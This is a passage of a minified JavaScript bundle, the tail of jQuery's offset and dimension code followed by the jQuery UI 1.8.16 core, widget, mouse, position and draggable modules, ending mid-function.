null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);f.offset.initialize();var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.offset.supportsFixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.offset.doesNotAddBorder&&(!f.offset.doesAddBorderForTableAndCells||!cs.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.offset.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.offset.supportsFixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={initialize:function(){var a=c.body,b=c.createElement("div"),d,e,g,h,i=parseFloat(f.css(a,"marginTop"))||0,j="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";f.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"}),b.innerHTML=j,a.insertBefore(b,a.firstChild),d=b.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,this.doesNotAddBorder=e.offsetTop!==5,this.doesAddBorderForTableAndCells=h.offsetTop===5,e.style.position="fixed",e.style.top="20px",this.supportsFixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",this.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==i,a.removeChild(b),f.offset.initialize=f.noop},bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.offset.initialize(),f.offset.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=ct.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!ct.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cu(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cu(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){var a=this[0];return a&&a.style?parseFloat(f.css(a,d,"padding")):null},f.fn["outer"+c]=function(a){var b=this[0];return b&&b.style?parseFloat(f.css(b,d,a?"margin":"border")):null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c],h=e.document.body;return e.document.compatMode==="CSS1Compat"&&g||h&&h["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var i=f.css(e,d),j=parseFloat(i);return f.isNaN(j)?i:j}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f})(window);











/*
 * jQuery UI 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI
 */
(function(c,j){function k(a,b){var d=a.nodeName.toLowerCase();if("area"===d){b=a.parentNode;d=b.name;if(!a.href||!d||b.nodeName.toLowerCase()!=="map")return false;a=c("img[usemap=#"+d+"]")[0];return!!a&&l(a)}return(/input|select|textarea|button|object/.test(d)?!a.disabled:"a"==d?a.href||b:b)&&l(a)}function l(a){return!c(a).parents().andSelf().filter(function(){return c.curCSS(this,"visibility")==="hidden"||c.expr.filters.hidden(this)}).length}c.ui=c.ui||{};if(!c.ui.version){c.extend(c.ui,{version:"1.8.16",keyCode:{ALT:18,BACKSPACE:8,CAPS_LOCK:20,COMMA:188,COMMAND:91,COMMAND_LEFT:91,COMMAND_RIGHT:93,CONTROL:17,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,INSERT:45,LEFT:37,MENU:93,NUMPAD_ADD:107,NUMPAD_DECIMAL:110,NUMPAD_DIVIDE:111,NUMPAD_ENTER:108,NUMPAD_MULTIPLY:106,NUMPAD_SUBTRACT:109,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SHIFT:16,SPACE:32,TAB:9,UP:38,WINDOWS:91}});c.fn.extend({propAttr:c.fn.prop||c.fn.attr,_focus:c.fn.focus,focus:function(a,b){return typeof a==="number"?this.each(function(){var d=this;setTimeout(function(){c(d).focus();b&&b.call(d)},a)}):this._focus.apply(this,arguments)},scrollParent:function(){var a;a=c.browser.msie&&/(static|relative)/.test(this.css("position"))||/absolute/.test(this.css("position"))?this.parents().filter(function(){return/(relative|absolute|fixed)/.test(c.curCSS(this,"position",1))&&/(auto|scroll)/.test(c.curCSS(this,"overflow",1)+c.curCSS(this,"overflow-y",1)+c.curCSS(this,"overflow-x",1))}).eq(0):this.parents().filter(function(){return/(auto|scroll)/.test(c.curCSS(this,"overflow",1)+c.curCSS(this,"overflow-y",1)+c.curCSS(this,"overflow-x",1))}).eq(0);return/fixed/.test(this.css("position"))||!a.length?c(document):a},zIndex:function(a){if(a!==j)return this.css("zIndex",a);if(this.length){a=c(this[0]);for(var b;a.length&&a[0]!==document;){b=a.css("position");if(b==="absolute"||b==="relative"||b==="fixed"){b=parseInt(a.css("zIndex"),10);if(!isNaN(b)&&b!==0)return b}a=a.parent()}}return 0},disableSelection:function(){return this.bind((c.support.selectstart?"selectstart":"mousedown")+".ui-disableSelection",function(a){a.preventDefault()})},enableSelection:function(){return this.unbind(".ui-disableSelection")}});c.each(["Width","Height"],function(a,b){function d(f,g,m,n){c.each(e,function(){g-=parseFloat(c.curCSS(f,"padding"+this,true))||0;if(m)g-=parseFloat(c.curCSS(f,"border"+this+"Width",true))||0;if(n)g-=parseFloat(c.curCSS(f,"margin"+this,true))||0});return g}var e=b==="Width"?["Left","Right"]:["Top","Bottom"],h=b.toLowerCase(),i={innerWidth:c.fn.innerWidth,innerHeight:c.fn.innerHeight,outerWidth:c.fn.outerWidth,outerHeight:c.fn.outerHeight};c.fn["inner"+b]=function(f){if(f===j)return i["inner"+b].call(this);return this.each(function(){c(this).css(h,d(this,f)+"px")})};c.fn["outer"+b]=function(f,g){if(typeof f!=="number")return i["outer"+b].call(this,f);return this.each(function(){c(this).css(h,d(this,f,true,g)+"px")})}});c.extend(c.expr[":"],{data:function(a,b,d){return!!c.data(a,d[3])},focusable:function(a){return k(a,!isNaN(c.attr(a,"tabindex")))},tabbable:function(a){var b=c.attr(a,"tabindex"),d=isNaN(b);return(d||b>=0)&&k(a,!d)}});c(function(){var a=document.body,b=a.appendChild(b=document.createElement("div"));c.extend(b.style,{minHeight:"100px",height:"auto",padding:0,borderWidth:0});c.support.minHeight=b.offsetHeight===100;c.support.selectstart="onselectstart"in b;a.removeChild(b).style.display="none"});c.extend(c.ui,{plugin:{add:function(a,b,d){a=c.ui[a].prototype;for(var e in d){a.plugins[e]=a.plugins[e]||[];a.plugins[e].push([b,d[e]])}},call:function(a,b,d){if((b=a.plugins[b])&&a.element[0].parentNode)for(var e=0;e<b.length;e++)a.options[b[e][0]]&&b[e][1].apply(a.element,d)}},contains:function(a,b){return document.compareDocumentPosition?a.compareDocumentPosition(b)&16:a!==b&&a.contains(b)},hasScroll:function(a,b){if(c(a).css("overflow")==="hidden")return false;b=b&&b==="left"?"scrollLeft":"scrollTop";var d=false;if(a[b]>0)return true;a[b]=1;d=a[b]>0;a[b]=0;return d},isOverAxis:function(a,b,d){return a>b&&a<b+d},isOver:function(a,b,d,e,h,i){return c.ui.isOverAxis(a,d,h)&&c.ui.isOverAxis(b,e,i)}})}})(jQuery);

/*
 * jQuery UI Widget 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Widget
 */
(function(b,j){if(b.cleanData){var k=b.cleanData;b.cleanData=function(a){for(var c=0,d;(d=a[c])!=null;c++)try{b(d).triggerHandler("remove")}catch(e){}k(a)}}else{var l=b.fn.remove;b.fn.remove=function(a,c){return this.each(function(){if(!c)if(!a||b.filter(a,[this]).length)b("*",this).add([this]).each(function(){try{b(this).triggerHandler("remove")}catch(d){}});return l.call(b(this),a,c)})}}b.widget=function(a,c,d){var e=a.split(".")[0],f;a=a.split(".")[1];f=e+"-"+a;if(!d){d=c;c=b.Widget}b.expr[":"][f]=function(h){return!!b.data(h,a)};b[e]=b[e]||{};b[e][a]=function(h,g){arguments.length&&this._createWidget(h,g)};c=new c;c.options=b.extend(true,{},c.options);b[e][a].prototype=b.extend(true,c,{namespace:e,widgetName:a,widgetEventPrefix:b[e][a].prototype.widgetEventPrefix||a,widgetBaseClass:f},d);b.widget.bridge(a,b[e][a])};b.widget.bridge=function(a,c){b.fn[a]=function(d){var e=typeof d==="string",f=Array.prototype.slice.call(arguments,1),h=this;d=!e&&f.length?b.extend.apply(null,[true,d].concat(f)):d;if(e&&d.charAt(0)==="_")return h;e?this.each(function(){var g=b.data(this,a),i=g&&b.isFunction(g[d])?g[d].apply(g,f):g;if(i!==g&&i!==j){h=i;return false}}):this.each(function(){var g=b.data(this,a);g?g.option(d||{})._init():b.data(this,a,new c(d,this))});return h}};b.Widget=function(a,c){arguments.length&&this._createWidget(a,c)};b.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",options:{disabled:false},_createWidget:function(a,c){b.data(c,this.widgetName,this);this.element=b(c);this.options=b.extend(true,{},this.options,this._getCreateOptions(),a);var d=this;this.element.bind("remove."+this.widgetName,function(){d.destroy()});this._create();this._trigger("create");this._init()},_getCreateOptions:function(){return b.metadata&&b.metadata.get(this.element[0])[this.widgetName]},_create:function(){},_init:function(){},destroy:function(){this.element.unbind("."+this.widgetName).removeData(this.widgetName);this.widget().unbind("."+this.widgetName).removeAttr("aria-disabled").removeClass(this.widgetBaseClass+"-disabled ui-state-disabled")},widget:function(){return this.element},option:function(a,c){var d=a;if(arguments.length===0)return b.extend({},this.options);if(typeof a==="string"){if(c===j)return this.options[a];d={};d[a]=c}this._setOptions(d);return this},_setOptions:function(a){var c=this;b.each(a,function(d,e){c._setOption(d,e)});return this},_setOption:function(a,c){this.options[a]=c;if(a==="disabled")this.widget()[c?"addClass":"removeClass"](this.widgetBaseClass+"-disabled ui-state-disabled").attr("aria-disabled",c);return this},enable:function(){return this._setOption("disabled",false)},disable:function(){return this._setOption("disabled",true)},_trigger:function(a,c,d){var e=this.options[a];c=b.Event(c);c.type=(a===this.widgetEventPrefix?a:this.widgetEventPrefix+a).toLowerCase();d=d||{};if(c.originalEvent){a=b.event.props.length;for(var f;a;){f=b.event.props[--a];c[f]=c.originalEvent[f]}}this.element.trigger(c,d);return!(b.isFunction(e)&&e.call(this.element[0],c,d)===false||c.isDefaultPrevented())}}})(jQuery);

/*
 * jQuery UI Mouse 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Mouse
 *
 * Depends:
 *jquery.ui.widget.js
 */
(function(b){var d=false;b(document).mouseup(function(){d=false});b.widget("ui.mouse",{options:{cancel:":input,option",distance:1,delay:0},_mouseInit:function(){var a=this;this.element.bind("mousedown."+this.widgetName,function(c){return a._mouseDown(c)}).bind("click."+this.widgetName,function(c){if(true===b.data(c.target,a.widgetName+".preventClickEvent")){b.removeData(c.target,a.widgetName+".preventClickEvent");c.stopImmediatePropagation();return false}});this.started=false},_mouseDestroy:function(){this.element.unbind("."+this.widgetName)},_mouseDown:function(a){if(!d){this._mouseStarted&&this._mouseUp(a);this._mouseDownEvent=a;var c=this,f=a.which==1,g=typeof this.options.cancel=="string"&&a.target.nodeName?b(a.target).closest(this.options.cancel).length:false;if(!f||g||!this._mouseCapture(a))return true;this.mouseDelayMet=!this.options.delay;if(!this.mouseDelayMet)this._mouseDelayTimer=setTimeout(function(){c.mouseDelayMet=true},this.options.delay);if(this._mouseDistanceMet(a)&&this._mouseDelayMet(a)){this._mouseStarted=this._mouseStart(a)!==false;if(!this._mouseStarted){a.preventDefault();return true}}true===b.data(a.target,this.widgetName+".preventClickEvent")&&b.removeData(a.target,this.widgetName+".preventClickEvent");this._mouseMoveDelegate=function(e){return c._mouseMove(e)};this._mouseUpDelegate=function(e){return c._mouseUp(e)};b(document).bind("mousemove."+this.widgetName,this._mouseMoveDelegate).bind("mouseup."+this.widgetName,this._mouseUpDelegate);a.preventDefault();return d=true}},_mouseMove:function(a){if(b.browser.msie&&!(document.documentMode>=9)&&!a.button)return this._mouseUp(a);if(this._mouseStarted){this._mouseDrag(a);return a.preventDefault()}if(this._mouseDistanceMet(a)&&this._mouseDelayMet(a))(this._mouseStarted=this._mouseStart(this._mouseDownEvent,a)!==false)?this._mouseDrag(a):this._mouseUp(a);return!this._mouseStarted},_mouseUp:function(a){b(document).unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate);if(this._mouseStarted){this._mouseStarted=false;a.target==this._mouseDownEvent.target&&b.data(a.target,this.widgetName+".preventClickEvent",true);this._mouseStop(a)}return false},_mouseDistanceMet:function(a){return Math.max(Math.abs(this._mouseDownEvent.pageX-a.pageX),Math.abs(this._mouseDownEvent.pageY-a.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return true}})})(jQuery);

/*
 * jQuery UI Position 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Position
 */
(function(c){c.ui=c.ui||{};var n=/left|center|right/,o=/top|center|bottom/,t=c.fn.position,u=c.fn.offset;c.fn.position=function(b){if(!b||!b.of)return t.apply(this,arguments);b=c.extend({},b);var a=c(b.of),d=a[0],g=(b.collision||"flip").split(" "),e=b.offset?b.offset.split(" "):[0,0],h,k,j;if(d.nodeType===9){h=a.width();k=a.height();j={top:0,left:0}}else if(d.setTimeout){h=a.width();k=a.height();j={top:a.scrollTop(),left:a.scrollLeft()}}else if(d.preventDefault){b.at="left top";h=k=0;j={top:b.of.pageY,left:b.of.pageX}}else{h=a.outerWidth();k=a.outerHeight();j=a.offset()}c.each(["my","at"],function(){var f=(b[this]||"").split(" ");if(f.length===1)f=n.test(f[0])?f.concat(["center"]):o.test(f[0])?["center"].concat(f):["center","center"];f[0]=n.test(f[0])?f[0]:"center";f[1]=o.test(f[1])?f[1]:"center";b[this]=f});if(g.length===1)g[1]=g[0];e[0]=parseInt(e[0],10)||0;if(e.length===1)e[1]=e[0];e[1]=parseInt(e[1],10)||0;if(b.at[0]==="right")j.left+=h;else if(b.at[0]==="center")j.left+=h/2;if(b.at[1]==="bottom")j.top+=k;else if(b.at[1]==="center")j.top+=k/2;j.left+=e[0];j.top+=e[1];return this.each(function(){var f=c(this),l=f.outerWidth(),m=f.outerHeight(),p=parseInt(c.curCSS(this,"marginLeft",true))||0,q=parseInt(c.curCSS(this,"marginTop",true))||0,v=l+p+(parseInt(c.curCSS(this,"marginRight",true))||0),w=m+q+(parseInt(c.curCSS(this,"marginBottom",true))||0),i=c.extend({},j),r;if(b.my[0]==="right")i.left-=l;else if(b.my[0]==="center")i.left-=l/2;if(b.my[1]==="bottom")i.top-=m;else if(b.my[1]==="center")i.top-=m/2;i.left=Math.round(i.left);i.top=Math.round(i.top);r={left:i.left-p,top:i.top-q};c.each(["left","top"],function(s,x){c.ui.position[g[s]]&&c.ui.position[g[s]][x](i,{targetWidth:h,targetHeight:k,elemWidth:l,elemHeight:m,collisionPosition:r,collisionWidth:v,collisionHeight:w,offset:e,my:b.my,at:b.at})});c.fn.bgiframe&&f.bgiframe();f.offset(c.extend(i,{using:b.using}))})};c.ui.position={fit:{left:function(b,a){var d=c(window);d=a.collisionPosition.left+a.collisionWidth-d.width()-d.scrollLeft();b.left=d>0?b.left-d:Math.max(b.left-a.collisionPosition.left,b.left)},top:function(b,a){var d=c(window);d=a.collisionPosition.top+a.collisionHeight-d.height()-d.scrollTop();b.top=d>0?b.top-d:Math.max(b.top-a.collisionPosition.top,b.top)}},flip:{left:function(b,a){if(a.at[0]!=="center"){var d=c(window);d=a.collisionPosition.left+a.collisionWidth-d.width()-d.scrollLeft();var g=a.my[0]==="left"?-a.elemWidth:a.my[0]==="right"?a.elemWidth:0,e=a.at[0]==="left"?a.targetWidth:-a.targetWidth,h=-2*a.offset[0];b.left+=a.collisionPosition.left<0?g+e+h:d>0?g+e+h:0}},top:function(b,a){if(a.at[1]!=="center"){var d=c(window);d=a.collisionPosition.top+a.collisionHeight-d.height()-d.scrollTop();var g=a.my[1]==="top"?-a.elemHeight:a.my[1]==="bottom"?a.elemHeight:0,e=a.at[1]==="top"?a.targetHeight:-a.targetHeight,h=-2*a.offset[1];b.top+=a.collisionPosition.top<0?g+e+h:d>0?g+e+h:0}}}};if(!c.offset.setOffset){c.offset.setOffset=function(b,a){if(/static/.test(c.curCSS(b,"position")))b.style.position="relative";var d=c(b),g=d.offset(),e=parseInt(c.curCSS(b,"top",true),10)||0,h=parseInt(c.curCSS(b,"left",true),10)||0;g={top:a.top-g.top+e,left:a.left-g.left+h};"using"in a?a.using.call(b,g):d.css(g)};c.fn.offset=function(b){var a=this[0];if(!a||!a.ownerDocument)return null;if(b)return this.each(function(){c.offset.setOffset(this,b)});return u.call(this)}}})(jQuery);

/*
 * jQuery UI Draggable 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Draggables
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.mouse.js
 *jquery.ui.widget.js
 */
(function(d){d.widget("ui.draggable",d.ui.mouse,{widgetEventPrefix:"drag",options:{addClasses:true,appendTo:"parent",axis:false,connectToSortable:false,containment:false,cursor:"auto",cursorAt:false,grid:false,handle:false,helper:"original",iframeFix:false,opacity:false,refreshPositions:false,revert:false,revertDuration:500,scope:"default",scroll:true,scrollSensitivity:20,scrollSpeed:20,snap:false,snapMode:"both",snapTolerance:20,stack:false,zIndex:false},_create:function(){if(this.options.helper=="original"&&!/^(?:r|a|f)/.test(this.element.css("position")))this.element[0].style.position="relative";this.options.addClasses&&this.element.addClass("ui-draggable");this.options.disabled&&this.element.addClass("ui-draggable-disabled");this._mouseInit()},destroy:function(){if(this.element.data("draggable")){this.element.removeData("draggable").unbind(".draggable").removeClass("ui-draggable ui-draggable-dragging ui-draggable-disabled");this._mouseDestroy();return this}},_mouseCapture:function(a){var b=this.options;if(this.helper||b.disabled||d(a.target).is(".ui-resizable-handle"))return false;this.handle=this._getHandle(a);if(!this.handle)return false;if(b.iframeFix)d(b.iframeFix===true?"iframe":b.iframeFix).each(function(){d('<div class="ui-draggable-iframeFix" style="background: #fff;"></div>').css({width:this.offsetWidth+"px",height:this.offsetHeight+"px",position:"absolute",opacity:"0.001",zIndex:1E3}).css(d(this).offset()).appendTo("body")});return true},_mouseStart:function(a){var b=this.options;this.helper=this._createHelper(a);this._cacheHelperProportions();if(d.ui.ddmanager)d.ui.ddmanager.current=this;this._cacheMargins();this.cssPosition=this.helper.css("position");this.scrollParent=this.helper.scrollParent();this.offset=this.positionAbs=this.element.offset();this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left};d.extend(this.offset,{click:{left:a.pageX-this.offset.left,top:a.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()});this.originalPosition=this.position=this._generatePosition(a);this.originalPageX=a.pageX;this.originalPageY=a.pageY;b.cursorAt&&this._adjustOffsetFromHelper(b.cursorAt);b.containment&&this._setContainment();if(this._trigger("start",a)===false){this._clear();return false}this._cacheHelperProportions();d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a);this.helper.addClass("ui-draggable-dragging");this._mouseDrag(a,true);d.ui.ddmanager&&d.ui.ddmanager.dragStart(this,a);return true},_mouseDrag:function(a,b){this.position=this._generatePosition(a);this.positionAbs=this._convertPositionTo("absolute");if(!b){b=this._uiHash();if(this._trigger("drag",a,b)===false){this._mouseUp({});return false}this.position=b.position}if(!this.options.axis||this.options.axis!="y")this.helper[0].style.left=this.position.left+"px";if(!this.options.axis||this.options.axis!="x")this.helper[0].style.top=this.position.top+"px";d.ui.ddmanager&&d.ui.ddmanager.drag(this,a);return false},_mouseStop:function(a){var b=false;if(d.ui.ddmanager&&!this.options.dropBehaviour)b=d.ui.ddmanager.drop(this,a);if(this.dropped){b=this.dropped;this.dropped=false}if((!this.element[0]||!this.element[0].parentNode)&&this.options.helper=="original")return false;if(this.options.revert=="invalid"&&!b||this.options.revert=="valid"&&b||this.options.revert===true||d.isFunction(this.options.revert)&&this.options.revert.call(this.element,b)){var c=this;d(this.helper).animate(this.originalPosition,parseInt(this.options.revertDuration,10),function(){c._trigger("stop",a)!==false&&c._clear()})}else this._trigger("stop",a)!==false&&this._clear();return false},_mouseUp:function(a){this.options.iframeFix===true&&d("div.ui-draggable-iframeFix").each(function(){this.parentNode.removeChild(this)});d.ui.ddmanager&&d.ui.ddmanager.dragStop(this,a);return d.ui.mouse.prototype._mouseUp.call(this,a)},cancel:function(){this.helper.is(".ui-draggable-dragging")?this._mouseUp({}):this._clear();return this},_getHandle:function(a){var b=!this.options.handle||!d(this.options.handle,this.element).length?true:false;d(this.options.handle,this.element).find("*").andSelf().each(function(){if(this==a.target)b=true});return b},_createHelper:function(a){var b=this.options;a=d.isFunction(b.helper)?d(b.helper.apply(this.element[0],[a])):b.helper=="clone"?this.element.clone().removeAttr("id"):this.element;a.parents("body").length||a.appendTo(b.appendTo=="parent"?this.element[0].parentNode:b.appendTo);a[0]!=this.element[0]&&!/(fixed|absolute)/.test(a.css("position"))&&a.css("position","absolute");return a},_adjustOffsetFromHelper:function(a){if(typeof a=="string")a=a.split(" ");if(d.isArray(a))a={left:+a[0],top:+a[1]||0};if("left"in a)this.offset.click.left=a.left+this.margins.left;if("right"in a)this.offset.click.left=this.helperProportions.width-a.right+this.margins.left;if("top"in a)this.offset.click.top=a.top+this.margins.top;if("bottom"in a)this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var a=this.offsetParent.offset();if(this.cssPosition=="absolute"&&this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0])){a.left+=this.scrollParent.scrollLeft();a.top+=this.scrollParent.scrollTop()}if(this.offsetParent[0]==document.body||this.offsetParent[0].tagName&&this.offsetParent[0].tagName.toLowerCase()=="html"&&d.browser.msie)a={top:0,left:0};return{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if(this.cssPosition=="relative"){var a=this.element.position();return{top:a.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:a.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}else return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.element.css("marginLeft"),10)||0,top:parseInt(this.element.css("marginTop"),10)||0,right:parseInt(this.element.css("marginRight"),10)||0,bottom:parseInt(this.element.css("marginBottom"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var a=this.options;if(a.containment=="parent")a.containment=this.helper[0].parentNode;if(a.containment=="document"||a.containment=="window")this.containment=[a.containment=="document"?0:d(window).scrollLeft()-this.offset.relative.left-this.offset.parent.left,a.containment=="document"?0:d(window).scrollTop()-this.offset.relative.top-this.offset.parent.top,(a.containment=="document"?0:d(window).scrollLeft())+d(a.containment=="document"?document:window).width()-this.helperProportions.width-this.margins.left,(a.containment=="document"?0:d(window).scrollTop())+(d(a.containment=="document"?document:window).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top];if(!/^(document|window|parent)$/.test(a.containment)&&a.containment.constructor!=Array){a=d(a.containment);var b=a[0];if(b){a.offset();var c=d(b).css("overflow")!="hidden";this.containment=[(parseInt(d(b).css("borderLeftWidth"),10)||0)+(parseInt(d(b).css("paddingLeft"),10)||0),(parseInt(d(b).css("borderTopWidth"),10)||0)+(parseInt(d(b).css("paddingTop"),10)||0),(c?Math.max(b.scrollWidth,b.offsetWidth):b.offsetWidth)-(parseInt(d(b).css("borderLeftWidth"),10)||0)-(parseInt(d(b).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left-this.margins.right,(c?Math.max(b.scrollHeight,b.offsetHeight):b.offsetHeight)-(parseInt(d(b).css("borderTopWidth"),10)||0)-(parseInt(d(b).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top-this.margins.bottom];this.relative_container=a}}else if(a.containment.constructor==Array)this.containment=a.containment},_convertPositionTo:function(a,b){if(!b)b=this.position;a=a=="absolute"?1:-1;var c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,f=/(html|body)/i.test(c[0].tagName);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollTop():f?0:c.scrollTop())*a),left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():f?0:c.scrollLeft())*a)}},_generatePosition:function(a){var b=this.options,c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,f=/(html|body)/i.test(c[0].tagName),e=a.pageX,h=a.pageY;if(this.originalPosition){var g;if(this.containment){if(this.relative_container){g=this.relative_container.offset();g=[this.containment[0]+g.left,this.containment[1]+g.top,this.containment[2]+g.left,this.containment[3]+g.top]}else g=this.containment;if(a.pageX-this.offset.click.left<g[0])e=g[0]+this.offset.click.left;if(a.pageY-this.offset.click.top<g[1])h=g[1]+this.offset.click.top;if(a.pageX-this.offset.click.left>g[2])e=g[2]+this.offset.click.left;if(a.pageY-this.offset.click.top>g[3])h=g[3]+this.offset.click.top}if(b.grid){h=b.grid[1]?this.originalPageY+Math.round((h-this.originalPageY)/b.grid[1])*b.grid[1]:this.originalPageY;h=g?!(h-this.offset.click.top<g[1]||h-this.offset.click.top>g[3])?h:!(h-this.offset.click.top<g[1])?h-b.grid[1]:h+b.grid[1]:h;e=b.grid[0]?this.originalPageX+Math.round((e-this.originalPageX)/b.grid[0])*b.grid[0]:this.originalPageX;e=g?!(e-this.offset.click.left<g[0]||e-this.offset.click.left>g[2])?e:!(e-this.offset.click.left<g[0])?e-b.grid[0]:e+b.grid[0]:e}}return{top:h-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollTop():f?0:c.scrollTop()),left:e-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():f?0:c.scrollLeft())}},_clear